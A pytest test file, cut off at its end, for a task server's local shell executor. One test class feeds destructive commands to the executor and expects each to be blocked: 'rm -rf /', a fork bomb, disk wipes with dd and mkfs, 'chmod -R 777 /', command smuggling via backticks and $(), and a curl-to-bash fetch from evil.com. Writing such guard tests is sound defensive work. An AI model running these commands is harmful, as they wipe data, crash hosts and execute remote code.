from __future__ import annotations

import asyncio
import os
import signal
from unittest.mock import MagicMock, patch

import pytest

from taskpps.executors.local import LocalExecutor


class TestLocalExecutor:
    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0557", domain="server/executors", priority="P0")
    async def test_echo(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "test.log"
        result = await executor.execute("echo hello world", {}, log_path)
        assert result.success
        assert "hello world" in result.stdout
        assert log_path.exists()

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0558", domain="server/executors", priority="P0")
    async def test_failure(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "test.log"
        result = await executor.execute("exit 42", {}, log_path)
        assert not result.success
        assert result.exit_code == 42

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0559", domain="server/executors", priority="P1")
    async def test_env(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "test.log"
        result = await executor.execute("echo $MY_VAR", {"MY_VAR": "test_value"}, log_path)
        assert result.success
        assert "test_value" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0560", domain="server/executors", priority="P1")
    async def test_timeout(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "test.log"
        result = await executor.execute("sleep 10", {}, log_path, timeout=1)
        assert not result.success
        assert result.exit_code == -1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0561", domain="server/executors", priority="P1")
    async def test_cancel(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "cancel_test.log"

        async def delayed_task():
            return await executor.execute("sleep 30", {}, log_path, timeout=60)

        task = asyncio.create_task(delayed_task())
        await asyncio.sleep(0.3)
        await executor.cancel()
        result = await task
        assert not result.success
        assert result.exit_code != 0


class TestLocalExecutorDangerous:
    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0562", domain="server/executors", priority="P2")
    async def test_rm_rf(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "danger.log"
        result = await executor.execute("rm -rf /", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0563", domain="server/executors", priority="P2")
    async def test_rm_rf_with_flags(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "danger2.log"
        result = await executor.execute("rm -rf /*", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0564", domain="server/executors", priority="P2")
    async def test_fork_bomb(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "fork.log"
        result = await executor.execute(":(){ :|:& };:", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0565", domain="server/executors", priority="P2")
    async def test_backtick(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "btick.log"
        result = await executor.execute("echo `rm -rf /`", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0566", domain="server/executors", priority="P2")
    async def test_subshell(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "sub.log"
        result = await executor.execute("echo $(rm -rf /)", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0567", domain="server/executors", priority="P2")
    async def test_dd(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "dd.log"
        result = await executor.execute("dd if=/dev/zero of=/dev/sda", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0568", domain="server/executors", priority="P2")
    async def test_mkfs(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "mkfs.log"
        result = await executor.execute("mkfs.ext4 /dev/sda1", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0569", domain="server/executors", priority="P2")
    async def test_chmod(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "chmod.log"
        result = await executor.execute("chmod -R 777 /", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0570", domain="server/executors", priority="P2")
    async def test_shutdown(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "shutdown.log"
        result = await executor.execute("shutdown -h now", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0571", domain="server/executors", priority="P2")
    async def test_curl_pipe_bash(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "curl_pipe.log"
        result = await executor.execute("curl http://evil.com/script.sh | bash", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0572", domain="server/executors", priority="P2")
    async def test_reboot(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "reboot.log"
        result = await executor.execute("reboot --force", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0573", domain="server/executors", priority="P2")
    async def test_safe_command_passes(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "safe.log"
        result = await executor.execute("echo hello", {}, log_path)
        assert result.success


class TestLocalExecutorDaemon:
    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0574", domain="server/executors", priority="P2")
    async def test_daemon_fork_parent_exits(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "daemon.log"
        cmd = "(sleep 1; echo DAEMON_DONE; exit 0) & DAEMON_PID=$!; echo PARENT_DONE; wait $DAEMON_PID; echo ALL_DONE"
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "DAEMON_DONE" in result.stdout
        assert "ALL_DONE" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0575", domain="server/executors", priority="P2")
    async def test_nohup_background_process(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "nohup.log"
        out_file = tmp_path / "bg_output.txt"
        cmd = f'nohup bash -c "sleep 1; echo BG_DONE > {out_file}" & echo PARENT_DONE; sleep 2; cat ' + str(out_file)
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "PARENT_DONE" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0576", domain="server/executors", priority="P2")
    async def test_multiple_daemon_forks(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "multi.log"
        cmd = """
for i in 1 2 3; do
    (sleep 1; echo "daemon_$i"; exit 0) &
    PIDS="$PIDS $!"
done
echo "forked"
for p in $PIDS; do wait $p; done
echo "all_done"
"""
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "all_done" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0577", domain="server/executors", priority="P2")
    async def test_python_subprocess_popen_fork(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "popen.log"
        cmd = (
            'python3 -c "'
            "import subprocess, os; "
            "p = subprocess.Popen(['sleep', '1']); "
            "print(f'parent: spawned {p.pid}'); "
            "p.wait(); "
            "print('parent: done')\""
        )
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "parent: done" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0578", domain="server/executors", priority="P2")
    async def test_python_thread_subprocess(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "thread.log"
        script = tmp_path / "thread_test.py"
        script.write_text(
            "import subprocess, threading\n"
            "def run():\n"
            "    subprocess.run(['echo', 'thread_done'])\n"
            "    print('thread: completed')\n"
            "t = threading.Thread(target=run)\n"
            "t.start()\n"
            "print('main: waiting')\n"
            "t.join()\n"
            "print('main: done')\n"
        )
        result = await executor.execute(f"python3 {script}", {}, log_path, timeout=10)
        assert result.success
        assert "thread: completed" in result.stdout
        assert "main: done" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0579", domain="server/executors", priority="P2")
    async def test_python_asyncio_subprocess(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "async.log"
        script = tmp_path / "async_test.py"
        script.write_text(
            "import asyncio\n"
            "async def main():\n"
            "    p = await asyncio.create_subprocess_exec('echo', 'async_done')\n"
            "    await p.wait()\n"
            "    print('async: completed')\n"
            "asyncio.run(main())\n"
        )
        result = await executor.execute(f"python3 {script}", {}, log_path, timeout=10)
        assert result.success
        assert "async: completed" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0580", domain="server/executors", priority="P2")
    async def test_daemon_with_pid_file(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "pidfile.log"
        pid_file = tmp_path / "daemon.pid"
        cmd = (
            f"(echo $$ > {pid_file}; sleep 1; echo PIDFILE_DONE; rm -f {pid_file}; exit 0) & wait $!; echo PARENT_DONE"
        )
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "PIDFILE_DONE" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0581", domain="server/executors", priority="P2")
    async def test_sighup_daemon_survives(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "sighup.log"
        marker = tmp_path / "marker.txt"
        cmd = f'(sleep 2; echo SURVIVED > {marker}; exit 0) & echo "parent_exit"'
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "parent_exit" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0582", domain="server/executors", priority="P2")
    async def test_collect_descendants(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "desc.log"
        cmd = (
            'bash -c "sleep 30" & '
            "B1=$!; "
            'bash -c "sleep 30" & '
            "B2=$!; "
            'echo "children: $B1 $B2"; '
            "kill $B1 $B2 2>/dev/null; "
            "echo DONE"
        )
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "DONE" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0583", domain="server/executors", priority="P1")
    async def test_version_marker_in_log(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "debug.log"
        result = await executor.execute("echo HELLO", {}, log_path, timeout=10)
        assert result.success
        log_content = log_path.read_text()
        assert "[VERSION] executor=v4-direct" in log_content
        assert "[INFO] Process started, PID:" in log_content
        assert "[INFO] Exit code: 0" in log_content

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0584", domain="server/executors", priority="P1")
    async def test_logs_written_for_daemon(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "daemon_debug.log"
        cmd = "(sleep 1; echo DAEMON; exit 0) & wait $!; echo DONE"
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        log_content = log_path.read_text()
        assert "[VERSION] executor=v4-direct" in log_content
        assert "[INFO] Exit code: 0" in log_content
        assert "DAEMON" in log_content
        assert "DONE" in log_content

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0585", domain="server/executors", priority="P1")
    async def test_log_direct_creates_file(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "subdir" / "test.log"
        executor._ensure_log_dir(log_path)
        executor._log_direct(log_path, "test message\n")
        assert log_path.exists()
        assert "test message" in log_path.read_text()

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0586", domain="server/executors", priority="P1")
    async def test_log_direct_appends(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "append.log"
        executor._log_direct(log_path, "line1\n")
        executor._log_direct(log_path, "line2\n")
        content = log_path.read_text()
        assert "line1" in content
        assert "line2" in content


class TestLocalExecutorBoundary:
    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0587", domain="server/executors", priority="P2")
    async def test_empty_command(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "empty.log"
        result = await executor.execute("", {}, log_path)
        assert result.success
        assert result.exit_code == 0

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0588", domain="server/executors", priority="P2")
    async def test_whitespace_only_command(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "ws.log"
        result = await executor.execute("   ", {}, log_path)
        assert result.success
        assert result.exit_code == 0

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0589", domain="server/executors", priority="P1")
    async def test_command_not_found(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "nf.log"
        result = await executor.execute("nonexistent_cmd_xyz", {}, log_path)
        assert not result.success
        assert result.exit_code == 127

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0590", domain="server/executors", priority="P2")
    async def test_nonzero_exit_code(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "nz.log"
        result = await executor.execute("exit 99", {}, log_path)
        assert not result.success
        assert result.exit_code == 99

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0591", domain="server/executors", priority="P1")
    async def test_process_self_kill(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "selfkill.log"
        result = await executor.execute("kill -9 $$", {}, log_path)
        assert not result.success
        assert result.exit_code < 0 or result.exit_code > 128

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0592", domain="server/executors", priority="P1")
    async def test_nonexistent_cwd(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "badcwd.log"
        cwd = "/nonexistent/path/xyz"
        result = await executor.execute("echo hello", {}, log_path, cwd=cwd)
        assert not result.success

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0593", domain="server/executors", priority="P2")
    async def test_command_with_special_characters(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "special.log"
        result = await executor.execute("echo 'hello \"world\" $HOME'", {}, log_path)
        assert result.success
        assert "hello" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0594", domain="server/executors", priority="P2")
    async def test_command_with_pipes(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "pipe.log"
        result = await executor.execute("echo hello | grep hello", {}, log_path)
        assert result.success
        assert "hello" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0595", domain="server/executors", priority="P2")
    async def test_rapid_exit_process(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "rapid.log"
        result = await executor.execute("true", {}, log_path)
        assert result.success
        assert result.exit_code == 0

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0596", domain="server/executors", priority="P1")
    async def test_rapid_fail_process(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "rapid_fail.log"
        result = await executor.execute("false", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0597", domain="server/executors", priority="P1")
    async def test_large_output(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "large.log"
        result = await executor.execute(
            "for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do echo line_$i; done", {}, log_path
        )
        assert result.success
        assert "line_1" in result.stdout
        assert "line_20" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0598", domain="server/executors", priority="P1")
    async def test_stderr_output(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "stderr.log"
        result = await executor.execute("echo stderr_msg >&2; echo stdout_msg", {}, log_path)
        assert result.success
        assert "stderr_msg" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0599", domain="server/executors", priority="P2")
    async def test_command_with_variable_expansion(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "expand.log"
        result = await executor.execute("echo $HOME", {}, log_path)
        assert result.success
        assert len(result.stdout.strip()) > 0

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0600", domain="server/executors", priority="P1")
    async def test_command_with_env_override(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "envovr.log"
        env = {"MY_CUSTOM_VAR": "custom_value", "PATH": os.environ.get("PATH", "/usr/bin")}
        result = await executor.execute("echo $MY_CUSTOM_VAR", env, log_path)
        assert result.success
        assert "custom_value" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0601", domain="server/executors", priority="P2")
    async def test_multiline_command(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "multi.log"
        cmd = "echo line1\necho line2\necho line3"
        result = await executor.execute(cmd, {}, log_path)
        assert result.success
        assert "line1" in result.stdout
        assert "line2" in result.stdout
        assert "line3" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0602", domain="server/executors", priority="P2")
    async def test_command_with_cd_and_run(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "cd_run.log"
        subdir = tmp_path / "sub"
        subdir.mkdir()
        result = await executor.execute(f"cd {subdir} && pwd", {}, log_path, cwd=str(tmp_path))
        assert result.success
        assert str(subdir) in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0603", domain="server/executors", priority="P2")
    async def test_command_exit_code_propagates_correctly(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "exit_prop.log"
        for code in [0, 1, 2, 42, 100, 255]:
            result = await executor.execute(f"exit {code}", {}, log_path)
            assert result.exit_code == code
            assert result.success == (code == 0)

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0604", domain="server/executors", priority="P1")
    async def test_timeout_with_fast_command(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "fast_timeout.log"
        result = await executor.execute("echo fast", {}, log_path, timeout=600)
        assert result.success
        assert result.exit_code == 0
        assert "fast" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0605", domain="server/executors", priority="P2")
    async def test_multiple_rapid_commands(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "multi_rapid.log"
        for i in range(10):
            result = await executor.execute(f"echo cmd_{i}", {}, log_path)
            assert result.success
            assert f"cmd_{i}" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0606", domain="server/executors", priority="P2")
    async def test_interrupted_sleep(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "intsleep.log"

        async def run():
            return await executor.execute("sleep 30", {}, log_path, timeout=1)

        task = asyncio.create_task(run())
        await asyncio.sleep(1.5)
        result = await task
        assert not result.success
        assert result.exit_code == -1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0607", domain="server/executors", priority="P2")
    async def test_shell_trap_hup_works(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "traphup.log"
        cmd = "bash -c 'trap \"echo GOT_HUP\" HUP; kill -HUP $$; echo AFTER_HUP'"
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "AFTER_HUP" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0608", domain="server/executors", priority="P1")
    async def test_command_with_null_bytes_in_output(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "nullbyte.log"
        result = await executor.execute("printf 'before\\x00after\\n'", {}, log_path, timeout=10)
        assert result.success
        assert "before" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0609", domain="server/executors", priority="P1")
    async def test_executor_version_in_log(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "ver.log"
        await executor.execute("echo test", {}, log_path)
        assert log_path.exists()
        content = log_path.read_text()
        assert "[VERSION] executor=v4-direct" in content
        assert "[INFO] Command length:" in content
        assert "[INFO] Shell:" in content


class TestLocalExecutorExitCodeCoverage:
    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0610", domain="server/executors", priority="P1")
    async def test_timeout_produces_exit_code_neg1(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "timeout.log"
        result = await executor.execute("sleep 10", {}, log_path, timeout=1)
        assert not result.success
        assert result.exit_code == -1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0611", domain="server/executors", priority="P1")
    async def test_cancel_produces_exit_code_neg1(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "canceled.log"

        async def delayed():
            return await executor.execute("sleep 30", {}, log_path, timeout=None)

        task = asyncio.create_task(delayed())
        await asyncio.sleep(0.3)
        await executor.cancel()
        result = await task
        assert not result.success
        assert result.exit_code == -1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0612", domain="server/executors", priority="P1")
    async def test_cancel_no_timeout_produces_exit_code_neg1(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "cancel_no_t.log"

        async def delayed():
            return await executor.execute("sleep 30", {}, log_path, timeout=None)

        task = asyncio.create_task(delayed())
        await asyncio.sleep(0.3)
        await executor.cancel()
        result = await task
        assert not result.success
        assert result.exit_code == -1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0613", domain="server/executors", priority="P1")
    async def test_process_killed_by_signal_yields_negative_exit(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "sigkill.log"
        result = await executor.execute("kill -9 $$", {}, log_path, timeout=10)
        assert not result.success
        assert result.exit_code < 0 or result.exit_code > 128

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0614", domain="server/executors", priority="P1")
    async def test_signal_death_logs_signal_name(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "sig_log.log"
        await executor.execute("kill -9 $$", {}, log_path, timeout=10)
        content = log_path.read_text()
        assert "SIGKILL" in content or "exit_code=-9" in content

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0615", domain="server/executors", priority="P1")
    async def test_subprocess_creation_failure(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "spawn_fail.log"
        with patch("asyncio.create_subprocess_exec", side_effect=OSError("cannot spawn")):
            result = await executor.execute("echo hi", {}, log_path)
        assert not result.success
        assert result.exit_code == 1
        assert "cannot spawn" in result.stderr

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0616", domain="server/executors", priority="P1")
    async def test_executor_cancel_kills_process_tree(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "kill_tree.log"

        async def delayed():
            return await executor.execute("sleep 30", {}, log_path, timeout=None)

        task = asyncio.create_task(delayed())
        await asyncio.sleep(0.3)

        with patch.object(executor, "_kill_process_tree") as mock_kill:
            await executor.cancel()
            mock_kill.assert_called_once()

        result = await task
        assert not result.success

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0617", domain="server/executors", priority="P1")
    async def test_cancel_with_already_finished_process(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "cancel_fin.log"
        await executor.execute("echo done", {}, log_path, timeout=10)
        await executor.cancel()
        assert executor._process is None

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0618", domain="server/executors", priority="P1")
    async def test_kill_process_tree_handles_permission_error(self, tmp_path):
        executor = LocalExecutor()

        with (
            patch("taskpps.executors.local._collect_descendants", return_value=[12345]),
            patch("os.kill", side_effect=PermissionError("denied")),
        ):
            executor._kill_process_tree(99999, signal.SIGTERM)

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0619", domain="server/executors", priority="P1")
    async def test_collect_descendants_handles_oserror(self, tmp_path):
        from taskpps.executors.local import _collect_descendants

        with patch("os.scandir", side_effect=OSError("proc unavailable")):
            result = _collect_descendants(1)
            assert result == []

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0620", domain="server/executors", priority="P2")
    async def test_collect_descendants_handles_bad_stat(self, tmp_path):
        from taskpps.executors.local import _collect_descendants

        with (
            patch("os.scandir") as mock_scandir,
            patch("builtins.open", side_effect=OSError("cannot read")),
        ):
            mock_entry = MagicMock()
            mock_entry.name = "12345"
            mock_entry.is_dir.return_value = False
            mock_scandir.return_value.__enter__.return_value = [mock_entry]
            result = _collect_descendants(1)
            assert result == []

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0621", domain="server/executors", priority="P1")
    async def test_log_direct_handles_exception(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "log_err.log"
        with patch("builtins.open", side_effect=OSError("disk full")):
            executor._log_direct(log_path, "test message\n")

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0622", domain="server/executors", priority="P1")
    async def test_read_and_write_handles_exception(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "rw_err.log"

        async def delayed():
            return await executor.execute("sleep 10", {}, log_path, timeout=30)

        task = asyncio.create_task(delayed())
        await asyncio.sleep(0.3)
        await executor.cancel()
        result = await task
        assert not result.success

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0623", domain="server/executors", priority="P1")
    async def test_timeout_wait_for_exception_caught(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "twait.log"

        with (
            patch.object(executor, "_kill_process_tree") as _mock_kill,
            patch.object(asyncio, "wait_for", side_effect=asyncio.TimeoutError()),
        ):
            result = await executor.execute("sleep 10", {}, log_path, timeout=1)
            assert not result.success
            assert result.exit_code == -1

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0624", domain="server/executors", priority="P1")
    async def test_cancelled_error_sigterm_then_sigkill(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "sigterm_kill.log"

        async def delayed():
            return await executor.execute("sleep 30", {}, log_path, timeout=None)

        task = asyncio.create_task(delayed())
        await asyncio.sleep(0.3)

        with patch.object(executor, "_kill_process_tree") as mock_kill:
            await executor.cancel()
            assert mock_kill.call_count >= 1

        result = await task
        assert not result.success

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0625", domain="server/executors", priority="P1")
    async def test_subprocess_fails_with_nonexistent_shell(self, tmp_path):
        with patch("taskpps.executors.local.get_settings") as mock_settings:
            mock_settings.return_value.executor.shell = "/nonexistent/shell"
            executor = LocalExecutor()
            log_path = tmp_path / "bad_shell.log"
            result = await executor.execute("echo hi", {}, log_path)
            assert not result.success
            assert result.exit_code == 1


class TestLocalExecutorProductionScenario:
    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0626", domain="server/executors", priority="P1")
    async def test_auto_robot_daemon_with_env_and_cwd(self, tmp_path):
        script = tmp_path / "auto_robot.py"
        script.write_text(
            "import subprocess, sys, time, os\n"
            "print('start to run auto-robot')\n"
            "print('Set project to: ebox')\n"
            "print(f'arguments: {sys.argv[1:]}')\n"
            "p = subprocess.Popen(['sleep', '120'])\n"
            "print(f'device_monitor PID: {p.pid}')\n"
            "print('device_monitor successfully')\n"
            "sys.stdout.flush()\n"
            "time.sleep(0.5)\n"
        )
        executor = LocalExecutor()
        log_path = tmp_path / "aosp.log"
        env = {"TASKPPS_RUN_ID": "test123", "TASKPPS_TASK_ID": "aosp_task"}
        cmd = f"python3 {script} -K off -d /tmp/report --loglevel DEBUG"
        result = await executor.execute(cmd, env, log_path, timeout=10, cwd=str(tmp_path))
        assert result.success
        assert result.exit_code == 0
        assert "start to run auto-robot" in result.stdout
        assert "device_monitor successfully" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0627", domain="server/executors", priority="P2")
    async def test_auto_robot_fork_bomb_pattern(self, tmp_path):
        script = tmp_path / "auto_robot_fork.py"
        script.write_text(
            "import subprocess, sys, time\n"
            "print('start to run auto-robot')\n"
            "procs = []\n"
            "for i in range(3):\n"
            "    p = subprocess.Popen(['sleep', '60'])\n"
            "    procs.append(p)\n"
            "    print(f'monitor_{i} PID: {p.pid}')\n"
            "print('all monitors started')\n"
            "sys.stdout.flush()\n"
            "time.sleep(0.5)\n"
            "print('auto-robot parent exiting')\n"
        )
        executor = LocalExecutor()
        log_path = tmp_path / "fork.log"
        result = await executor.execute(f"python3 {script}", {}, log_path, timeout=15)
        assert result.success
        assert result.exit_code == 0
        assert "auto-robot parent exiting" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0628", domain="server/executors", priority="P1")
    async def test_auto_robot_with_pipeline_env_vars(self, tmp_path):
        script = tmp_path / "env_check.py"
        script.write_text(
            "import os\n"
            "run_id = os.environ.get('TASKPPS_RUN_ID', 'MISSING')\n"
            "task_id = os.environ.get('TASKPPS_TASK_ID', 'MISSING')\n"
            "print(f'RUN_ID={run_id}')\n"
            "print(f'TASK_ID={task_id}')\n"
        )
        executor = LocalExecutor()
        log_path = tmp_path / "env.log"
        env = {
            "TASKPPS_RUN_ID": "bddf5a89a207",
            "TASKPPS_TASK_ID": "Automation Weekly Tests.AOSP",
        }
        result = await executor.execute(f"python3 {script}", env, log_path, timeout=10)
        assert result.success
        assert "RUN_ID=bddf5a89a207" in result.stdout
        assert "TASK_ID=Automation Weekly Tests.AOSP" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0629", domain="server/executors", priority="P2")
    async def test_auto_robot_rapid_start_exit(self, tmp_path):
        script = tmp_path / "rapid.py"
        script.write_text(
            "import subprocess, time\n"
            "print('start to run auto-robot')\n"
            "p = subprocess.Popen(['sleep', '120'])\n"
            "print(f'PID: {p.pid}')\n"
            "time.sleep(0.3)\n"
            "print('parent done')\n"
        )
        executor = LocalExecutor()
        log_path = tmp_path / "rapid.log"
        result = await executor.execute(f"python3 {script}", {}, log_path, timeout=10)
        assert result.success
        assert result.exit_code == 0

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0630", domain="server/executors", priority="P2")
    async def test_auto_robot_multiline_command_with_cd(self, tmp_path):
        report_dir = tmp_path / "report"
        report_dir.mkdir()
        script = tmp_path / "auto_robot.py"
        script.write_text(
            "import os, sys\n"
            "print(f'CWD: {os.getcwd()}')\n"
